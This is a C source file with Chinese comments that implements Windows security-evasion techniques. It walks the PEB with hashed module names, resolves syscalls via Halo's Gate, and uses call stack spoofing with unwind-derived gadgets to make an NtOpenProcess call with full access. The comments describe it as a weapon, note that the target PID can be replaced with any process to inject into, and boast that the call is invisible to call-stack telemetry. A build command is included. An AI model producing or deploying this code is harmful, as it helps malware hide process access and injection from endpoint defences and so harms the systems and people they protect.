/* main.c */
#include "halo_gate.h"
#include "spoof.h"
#include <intrin.h> // for __readgsqword

#define NTDLL_HASH 0x22d3b5ed
// 必须的底层结构体定义

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

// 定义我们的终极武器签名：它长着 NtOpenProcess 的脸，但其实是 SpoofedSyscall 的心
typedef NTSTATUS (NTAPI* fnSpoofedNtOpenProcess)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId
);

// 声明你在 gate.s 中写的外部汇编函数
extern void SetSSN(DWORD ssn);
extern void SetSyscallAddr(PVOID addr);
extern void SetSpoofParams(PVOID gadgetAddr, DWORD stackSize);
extern NTSTATUS SpoofedSyscall();

int main() {
    //初始化检查
    BOOL bEngineReady = FALSE; 

    // ... 初始化 PEB 和 Ldr ...
    // 1. 获取 PEB
    PMY_PEB pPEB = (PMY_PEB)__readgsqword(0x60);
    PMY_PEB_LDR_DATA pLdr = pPEB->Ldr;
    
    // 2. 遍历模块链表
    LIST_ENTRY* pListHead = &pLdr->InMemoryOrderModuleList;
    LIST_ENTRY* pCurrentEntry = pListHead->Flink;

    PVOID pNtdll = NULL;//设置一个全局变量来存放ntdll.dll基地址



    //halo's gate逻辑
    printf("[*] Initialing Halo's Gate Logic...");
    while (pCurrentEntry != pListHead) {
        //获取pEntry
        PMY_LDR_DATA_TABLE_ENTRY pEntry = (PMY_LDR_DATA_TABLE_ENTRY)(
            (unsigned char*)pCurrentEntry - sizeof(LIST_ENTRY)
        );
        if (pEntry->BaseDllName.Buffer != NULL) {
            DWORD currentHash = djb2_hash(pEntry->BaseDllName.Buffer);
            
            if (currentHash == NTDLL_HASH) {
                printf("[+] Found ntdll.dll...\n");
                pNtdll = pEntry->DllBase; //赋值储存
                InitApiTable(pEntry->DllBase); // 初始化系统调用表
                bEngineReady = TRUE;           // 标记成功
                break;                         // 找到后立即退出循环
            }
        }
        pCurrentEntry = pCurrentEntry->Flink;
    }
    // 必须在循环外检查引擎是否就绪
    if (!bEngineReady) {
        printf("[-] Failed to initialize Engine. Aborting.\n");
        return -1;
    }

    //call stack spoofing逻辑
    DWORD dwRuntimeFunctionCount = 0; // 
    printf("[*] Initializing Call Stack Spoofing...");
    PVOID pRuntimeFunctionAddr = getRuntimeFunctionEntry(pNtdll, &dwRuntimeFunctionCount);
    
    unWindInfoResolution(pNtdll, pRuntimeFunctionAddr, &dwRuntimeFunctionCount);
    if (g_GadgetCount == 0) {
        printf("[-] No Golden Gadgets found. The gun is empty.\n");
        return -1;
    }
    printf("[!!!] %d Golem Gadgets Found...\n", g_GadgetCount);
    
    //开火
    //还是以NtOpenProcess为例，先通过Halo‘s Gate获取SSN和syscall。
    PVOID pNtOpenProcess = GetApi(0x5003c058); 
    if (pNtOpenProcess){
        HALO_ENTRY entry;
        if(GetHaloEntry(pNtOpenProcess, &entry)){
        // 1. 准备目标参数
        HANDLE hTargetProcess = NULL;
        OBJECT_ATTRIBUTES oa = { 0 };
        oa.Length = sizeof(OBJECT_ATTRIBUTES); // 必须初始化长度，否则内核会报错
        
        CLIENT_ID cid = { 0 };
        // 为了安全测试，我们 Open 我们自己。你可以替换成任何你想要注入的 PID
        cid.UniqueProcess = (HANDLE)(ULONG_PTR)GetCurrentProcessId(); 

        // 2. 装填弹药 (Weaponizing the Engine)
        // 假设你的 Halo's Gate 已经获取到了 wNtOpenProcessSSN 和 pNtOpenProcessSyscallAddr
        // 这里你需要替换成你真实解析到的变量名！
        SetSSN(entry.SSN); 
        SetSyscallAddr(entry.SyscallAddress);
        
        // 取出最完美的第一个傀儡 (Gadget 0) 穿上隐身衣
        SetSpoofParams(GoldenGadgets[0].pGadgetAddress, GoldenGadgets[0].dwStackSize);

        printf("[*] Engine Loaded. Target PID: %lu. Firing...\n", GetCurrentProcessId());

        // 3. 强转函数指针：把汇编存根披上 NtOpenProcess 的外衣
        fnSpoofedNtOpenProcess pSpoofedNtOpenProcess = (fnSpoofedNtOpenProcess)SpoofedSyscall;

        // 4. THE PUNCHLINE: 开枪！
        // 此时 C 语言编译器会乖乖把这 4 个参数放进 RCX, RDX, R8, R9 寄存器
        // 然后跳入你的 SpoofedSyscall 进行堆栈伪造！
        NTSTATUS status = pSpoofedNtOpenProcess(&hTargetProcess, PROCESS_ALL_ACCESS, &oa, &cid);

        // 5. 战果确认
        if (status == 0x00000000) { // 0x00000000 即 STATUS_SUCCESS
            printf("[+] MASTERPIECE! Successfully got handle: 0x%p\n", hTargetProcess);
            printf("[+] This call was completely invisible to Call Stack Telemetry.\n");
        } else {
            printf("[-] Misfire! NTSTATUS Code: 0x%08X\n", status);
        }

        getchar();
        return 0;
        }

    }
}

//x86_64-w64-mingw32-gcc -I include src/main.c src/halo_gate.c src/spoof.c asm/gate.s -o halo_spoofer.exe -m64 -static -w

/*
如果你要搬运 N 个参数，你寻找的傀儡 Gadget 的 size 必须大于 0x20 + (N * 8) 字节。 
比如有 6 个参数，就只使用 size >= 72 (0x48) 的 Gadget。这样 rsp + 0x28 就永远够不到 R11，你的返回地址就绝对安全。
*/